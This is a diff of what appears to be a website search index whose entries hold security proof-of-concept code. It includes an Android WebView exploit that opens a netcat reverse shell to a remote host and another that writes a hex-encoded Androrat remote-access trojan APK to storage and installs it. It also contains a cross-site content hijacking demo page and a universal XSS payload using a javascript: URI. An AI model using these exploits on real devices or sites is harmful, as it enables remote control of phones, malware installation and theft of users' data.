@@ -1078,8 +1078,18 @@
   </entry>
   <entry>
     <title></title>
+    <url>%2Ftools%2FflashCSRF%2FContentHijacking.html</url>
+    <content type="text"><![CDATA[Cross Site Content Hijacking Demo! html, body { height: 100%; overflow: auto; } body { padding: 0; margin: 0; } table { /* table-layout: fixed;*/ border-collapse: collapse; border-spacing: 0; width: 100%; } th { font-family: verdana; color: white; vertical-align: middle; background-color: black; } td { font-family: verdana; word-wrap:break-word; height: 30px; max-width: 600px; } #silverlightControlHost { height: 100%; text-align:center; } .info { background: #ffff00; } .logdata:nth-last-child(2n-1) { background: #ccc; } .logdata { white-space: pre-wrap; white-space: -moz-pre-wrap; white-space: -pre-wrap; white-space: -o-pre-wrap; word-wrap: break-word; overflow:auto; max-height: 300px; } .note { font-family: courier; font-size: 15px; } //PDF related var isPDFLoaded = 0; function createMessageHandler(objPDF) { if(objPDF != null){ objPDF.messageHandler = { onMessage: function(msg) { try{ if(msg[0]=='loaded' && msg[1]=='1'){ // The created PDF files sends the load message continuously for 5 seconds to make sure HTML is ready... if(isPDFLoaded===1) return; isPDFLoaded = 1; pdfLoaded(); }else{ javaScriptLogData(msg[0]); } }catch(e){ } }, onError: function(error, msg) { alert(error.message); } } } } var objPDFCheckInterval; var objPDFCheckIntervalCounter = 0; // This function is called from JavaScript via setTimeout. function pdfLoaded() { objPDFCheckIntervalCounter++; var objPDF = document.getElementById('myObject'); if(isPDFLoaded===1){ clearTimeout(objPDFCheckInterval); javaScriptLogData("PDF object has been loaded successfuly."); callTheObj(); }else if(objPDFCheckIntervalCounter]]></content>
+  </entry>
+  <entry>
+    <title></title>
     <url>%2Ftools%2FflashCSRF%2Findex.html</url>
     <content type="text"><![CDATA[document.location = 'ContentHijacking.html';]]></content>
+  </entry>
+  <entry>
+    <title></title>
+    <url>%2Ftools%2Fwebviewpoc%2Fshell.js</url>
+    <content type="text"><![CDATA[function execute(cmdArgs) { return XXX.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs); } execute(["/system/bin/sh","-c","nc 192.168.1.9 8088|/system/bin/sh|nc 192.168.1.9 9999"]); alert("ok3");]]></content>
   </entry>
   <entry>
     <title></title>
@@ -1088,23 +1098,13 @@
   </entry>
   <entry>
     <title></title>
-    <url>%2Ftools%2FflashCSRF%2FContentHijacking.html</url>
-    <content type="text"><![CDATA[Cross Site Content Hijacking Demo! html, body { height: 100%; overflow: auto; } body { padding: 0; margin: 0; } table { /* table-layout: fixed;*/ border-collapse: collapse; border-spacing: 0; width: 100%; } th { font-family: verdana; color: white; vertical-align: middle; background-color: black; } td { font-family: verdana; word-wrap:break-word; height: 30px; max-width: 600px; } #silverlightControlHost { height: 100%; text-align:center; } .info { background: #ffff00; } .logdata:nth-last-child(2n-1) { background: #ccc; } .logdata { white-space: pre-wrap; white-space: -moz-pre-wrap; white-space: -pre-wrap; white-space: -o-pre-wrap; word-wrap: break-word; overflow:auto; max-height: 300px; } .note { font-family: courier; font-size: 15px; } //PDF related var isPDFLoaded = 0; function createMessageHandler(objPDF) { if(objPDF != null){ objPDF.messageHandler = { onMessage: function(msg) { try{ if(msg[0]=='loaded' && msg[1]=='1'){ // The created PDF files sends the load message continuously for 5 seconds to make sure HTML is ready... if(isPDFLoaded===1) return; isPDFLoaded = 1; pdfLoaded(); }else{ javaScriptLogData(msg[0]); } }catch(e){ } }, onError: function(error, msg) { alert(error.message); } } } } var objPDFCheckInterval; var objPDFCheckIntervalCounter = 0; // This function is called from JavaScript via setTimeout. function pdfLoaded() { objPDFCheckIntervalCounter++; var objPDF = document.getElementById('myObject'); if(isPDFLoaded===1){ clearTimeout(objPDFCheckInterval); javaScriptLogData("PDF object has been loaded successfuly."); callTheObj(); }else if(objPDFCheckIntervalCounter]]></content>
-  </entry>
-  <entry>
-    <title></title>
-    <url>%2Ftools%2Fwebviewpoc%2Fguama.js</url>
-    <content type="text"><![CDATA[function execute(cmdArgs) { return xxx.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs); } var armBinary1 = "x50x4Bx03x04x14x00x08x00x08x00x51x8FxCAx40x00x00x00x00x00x00x00x00x00x00x00x00x13x00x04x00x72x65x73x2Fx6Cx61x79x6Fx75x74x2Fx6Dx61x69x6Ex2Ex78x6Dx6CxFExCAx00x00xADx52x31x6FxD3x40x18xFDx2Ex76xAEx86xC4x69x5Ax3Ax54xA2x12xA9xC4 var armBinary2="x1BxB0x65x0AxADx23xC2x30x64xDFxEExA1x0DxA4xE8x3Fx61x80xEExBCxE1xE7x7Bx4Ax25x6Fx8Bx36x71xC3x80x81x58xDBxC9x8Fx53x9FxEEx8Ax45xAFx23x54x4AxCFx2Bx52xF2x33x84xBAx82x36xC4x0Dx08xAFxC2x61x8ExD8x7Bx0BxFCx88x4Ax25x24x8Cx22xFAx76x44x78x5Ex99x62x30x44x8DxDBx74x94 var armBinary3=… var armBinary4=… …… var patharm = "/mnt/sdcard/Androrat.apk"; var a=execute(["/system/bin/sh","-c","echo -n +armBinary1+ > " + patharm]); //alert(a); execute(["/system/bin/sh","-c","echo -n +armBinary2+ >> " + patharm]); execute(["/system/bin/sh","-c","echo -n +armBinary3+ >> " + patharm]); execute(["/system/bin/sh","-c","echo -n +armBinary4+ >> " + patharm]); execute(["/system/bin/sh","-c","adb install /mnt/sdcard/Androrat.apk"]); alert("over !!!");]]></content>
-  </entry>
-  <entry>
-    <title></title>
     <url>%2Ftools%2Fuxss%2Fpoc2.html</url>
     <content type="text"><![CDATA[i = document.body.appendChild(document.createElement("iframe")); i.src = "http://m.baidu.com"; i.onload = function() { document.documentURI = "javascript://hostname.com/%0D%0Aalert('OH HAI ' + location)"; i.contentWindow.location = ""; } L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});]]></content>
   </entry>
   <entry>
     <title></title>
-    <url>%2Ftools%2Fwebviewpoc%2Fshell.js</url>
-    <content type="text"><![CDATA[function execute(cmdArgs) { return XXX.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs); } execute(["/system/bin/sh","-c","nc 192.168.1.9 8088|/system/bin/sh|nc 192.168.1.9 9999"]); alert("ok3");]]></content>
+    <url>%2Ftools%2Fwebviewpoc%2Fguama.js</url>
+    <content type="text"><![CDATA[function execute(cmdArgs) { return xxx.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs); } var armBinary1 = "x50x4Bx03x04x14x00x08x00x08x00x51x8FxCAx40x00x00x00x00x00x00x00x00x00x00x00x00x13x00x04x00x72x65x73x2Fx6Cx61x79x6Fx75x74x2Fx6Dx61x69x6Ex2Ex78x6Dx6CxFExCAx00x00xADx52x31x6FxD3x40x18xFDx2Ex76xAEx86xC4x69x5Ax3Ax54xA2x12xA9xC4 var armBinary2="x1BxB0x65x0AxADx23xC2x30x64xDFxEExA1x0DxA4xE8x3Fx61x80xEExBCxE1xE7x7Bx4Ax25x6Fx8Bx36x71xC3x80x81x58xDBxC9x8Fx53x9FxEEx8Ax45xAFx23x54x4AxCFx2Bx52xF2x33x84xBAx82x36xC4x0Dx08xAFxC2x61x8ExD8x7Bx0BxFCx88x4Ax25x24x8Cx22xFAx76x44x78x5Ex99x62x30x44x8DxDBx74x94 var armBinary3=… var armBinary4=… …… var patharm = "/mnt/sdcard/Androrat.apk"; var a=execute(["/system/bin/sh","-c","echo -n +armBinary1+ > " + patharm]); //alert(a); execute(["/system/bin/sh","-c","echo -n +armBinary2+ >> " + patharm]); execute(["/system/bin/sh","-c","echo -n +armBinary3+ >> " + patharm]); execute(["/system/bin/sh","-c","echo -n +armBinary4+ >> " + patharm]); execute(["/system/bin/sh","-c","adb install /mnt/sdcard/Androrat.apk"]); alert("over !!!");]]></content>
   </entry>
   <entry>
     <title></title>
